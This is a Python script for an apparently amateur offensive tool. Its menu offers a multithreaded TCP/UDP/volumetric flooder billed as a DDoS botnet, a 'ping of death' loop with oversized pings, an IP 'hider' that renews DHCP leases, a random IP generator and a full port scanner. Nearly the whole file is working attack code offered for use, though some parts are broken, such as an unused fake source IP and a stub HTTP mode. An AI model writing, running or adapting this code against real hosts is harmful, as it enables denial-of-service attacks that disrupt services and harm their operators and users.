import os
import random
import re
import subprocess
import socket
import threading
import time
import locale

def show_banner():
    print("")
    print("\033[41m\033[30m")  
    print("   _____      _ _       _                     _    ___          _____ _    _ _____ ")
    print("  / ____|    | | |     | |                   | |  / _ \        / ____| |  | |_   _|")
    print(" | |     ___ | | | __ _| |__   ___  _ __ __ _| |_| | | |_ __  | |  __| |  | | | |  ")
    print(" | |    / _ \| | |/ _` | '_ \ / _ \| '__/ _` | __| | | | '__| | | |_ | |  | | | |  ")
    print(" | |___| (_) | | | (_| | |_) | (_) | | | (_| | |_| |_| | |    | |__| | |__| |_| |_ ")
    print("  \_____\___/|_|_|\__,_|_.__/ \___/|_|  \__,_|\__|\___/|_|     \_____|\____/|_____|")
    print("\033[0m")  

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ======================== AR2 Banner ========================
def ar2_banner():
    print("")
    print("\033[91m")  
    print("              ___                 _ _            _   ")
    print("     /\      |__ \               | | |          | |  ")
    print("    /  \   _ __ ) |   _ __  _   _| | |_ __   ___| |_ ")
    print("   / /\ \ | '__/ /   | '_ \| | | | | | '_ \ / _ \ __|")
    print("  / ____ \| | / /_   | | | | |_| | | | | | |  __/ |_ ")
    print(" /_/    \_\_||____|  |_| |_|\__,_|_|_|_| |_|\___|\__|")
    print("\033[0m")  

# ======================== Executor Banner ========================
def exec_banner():
    print("")
    print("\033[91m")  
    print(" ______      ____             _             ")
    print("|  ____|    |___ \           | |            ")
    print("| |__  __  __ __) | ___ _   _| |_ ___  _ __ ")
    print("|  __| \ \/ /|__ < / __| | | | __/ _ \| '__|")
    print("| |____ >  < ___) | (__| |_| | || (_) | |   ")
    print("|______/_/\_\____/ \___|\__,_|\__\___/|_|   ")
    print("\033[0m")  

# ======================== Generate Random IP ========================
def generate_random_ip():
    random_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
    print(f"Generated Random IP: \033[91m{random_ip}\033[0m")

# ======================== DDoS Attack Functions ========================
def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def attack(target_ip, target_port, bot_id, attack_type, fake_ip):
    try:
        attack_count = 0
        while True:
            if attack_type == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            elif attack_type == "UDP":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"GET /", (target_ip, target_port))
            elif attack_type == "HTTP":
                print(f"HTTP attack sent by bot {bot_id} to {target_ip}:{target_port}")
                continue
            elif attack_type == "VOLUMETRIC":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)
                s.sendto(packet, (target_ip, target_port))
                continue
            else:
                print("\033[91mInvalid attack type\033[0m")
                return

            attack_count += 1
            print(f"\033[91mBot {bot_id} attack sent to {target_ip} on port {target_port}\033[0m")
            s.close()
    except Exception as e:
        print("\033[91mError:", e, "\033[0m")

def create_attacks(target_ip, target_port, attack_type, num_bots):
    threads = []
    for i in range(num_bots):
        fake_ip = generate_fake_ip()
        thread = threading.Thread(target=attack, args=(target_ip, target_port, i + 1, attack_type, fake_ip))
        thread.start()
        threads.append(thread)
    return threads

def ddos_menu():
    clear_screen()
    ar2_banner()  # Show AR2 banner before the DDoS menu
    print("\033[91m<===========================>\033[0m")
    target_ip = input("\033[91mInsert IP: ")
    target_port = int(input("\033[91mInsert Port: "))
    attack_type = input("\033[91mEnter attack type (TCP/UDP/HTTP/VOLUMETRIC): ").upper()
    num_bots = int(input("\033[91mNumber of bots: "))
    create_attacks(target_ip, target_port, attack_type, num_bots)

# ======================== IP Hider Functions ========================

def get_current_ip():
    encoding = locale.getpreferredencoding()
    ipconfig_result = subprocess.check_output(["ipconfig"], shell=True).decode(encoding, errors='ignore')
    match = re.search(r"IPv4 Address.*?: (\d+\.\d+\.\d+\.\d+)", ipconfig_result)
    return match.group(1) if match else None

def change_ip():
    real_ip = get_current_ip()
    subprocess.call(["ipconfig", "/release"])
    subprocess.call(["ipconfig", "/renew"])
    new_ip = get_current_ip()
    print(f"IP changed from \033[91m{real_ip}\033[0m to \033[91m{new_ip}\033[0m")

def reset_ip():
    subprocess.call(["ipconfig", "/release"])
    subprocess.call(["ipconfig", "/renew"])

def show_current_ip():
    current_ip = get_current_ip()
    print(f"Current IP address: \033[91m{current_ip}\033[0m" if current_ip else "Could not retrieve IP.")

def ip_hidder_menu():
    clear_screen()
    print("\033[91mIp hidder\033[0m")
    print("\033[91m1 Change IP")
    print("\033[91m2 Reset IP")
    choice = input("\033[91minsert command: ")
    if choice == "1":
        change_ip()
    elif choice == "2":
        reset_ip()
    input("\033[91mPress Enter to continue...\033[0m")

# ======================== Ping Executor Functions ========================

def send_death_ping(target_ip):
    try:
        while True:
            command = f"\033[91mping -s 65500 {target_ip}" if os.name != 'nt' else f"ping -l 65500 -n 1 {target_ip}"
            subprocess.run(command, shell=True)
            print(f"\033[91mPing sent to {target_ip}\033[0m")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\033[91mStopping ping.\033[0m")

def ping_executor_menu():
    clear_screen()
    exec_banner()  # Show Executor banner before the menu
    print("\033[91m\033[0m")
    target_ip = input("\033[91minsert target Ip: ")
    send_death_ping(target_ip)

# ======================== Port Scanner Function ========================

def port_scan(target_ip):
    open_ports = []
    print(f"\033[91mScanning open ports on {target_ip}\033[0m")
    for port in range(1, 65535):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    if open_ports:
        print(f"\033[91mOpen ports on {target_ip}:\033[0m")
        for port in open_ports:
            print(f"\033[91mPort {port} is open\033[0m")
    else:
        print("\033[91mNo open ports found.\033[0m")

# ======================== Main Menu ========================

def display_main_menu():
    clear_screen()
    show_banner()
    print("\033[91m <============================================================>\033[0m")
    print("\033[91m <debugger console>\033[0m")
    print("\033[91m1): Ar2 nullnet")
    print("\033[91m2): Ip hidder")
    print("\033[91m3): Executor")
    print("\033[91m4): Ip generator")
    print("\033[91m5): Port scanner")
    print("\033[91m6): Exit")
    print("\033[91m\033[0m")
    print("\033[91m <============================================================>\033[0m")

def main():
    while True:
        display_main_menu()
        choice = input("\033[91m Insert command: ")
        if choice == "1":
            ddos_menu()
        elif choice == "2":
            ip_hidder_menu()
        elif choice == "3":
            ping_executor_menu()
        elif choice == "4":
            generate_random_ip()
            input("\033[91m Press Enter to continue...\033[0m")
        elif choice == "5":
            target_ip = input("Insert IP: ")
            port_scan(target_ip)
            input("\033[91m Press Enter to continue...\033[0m")
        elif choice == "6":
            print("\033[91mExiting program...\033[0m")
            break
        else:
            print("\033[91mInvalid option. Try again.\033[0m")

if __name__ == "__main__":
    main()
